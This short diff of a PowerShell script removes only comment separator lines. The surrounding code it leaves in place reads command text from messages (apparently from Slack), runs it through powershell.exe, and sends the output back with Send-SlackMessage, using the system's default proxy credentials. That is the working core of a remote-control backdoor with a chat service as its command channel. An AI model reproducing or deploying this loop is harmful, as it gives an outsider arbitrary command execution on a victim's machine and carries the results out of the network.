@@ -25,11 +25,7 @@ $cmd2=$cmd.messages | foreach {$_.text}
 
 [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials #This line tells the system to use the default proxy
 
-#-----------Execute cmd start---------------------------------------------
 Get-CMD
 $tosend=powershell.exe $cmd2 | Out-String
-#-----------Execute cmd end-----------------------------------------------
-
-#-------------------------------------------------------------------------
 Send-SlackMessage "$tosend"
-#-----------Send data end-------------------------------------------------
+
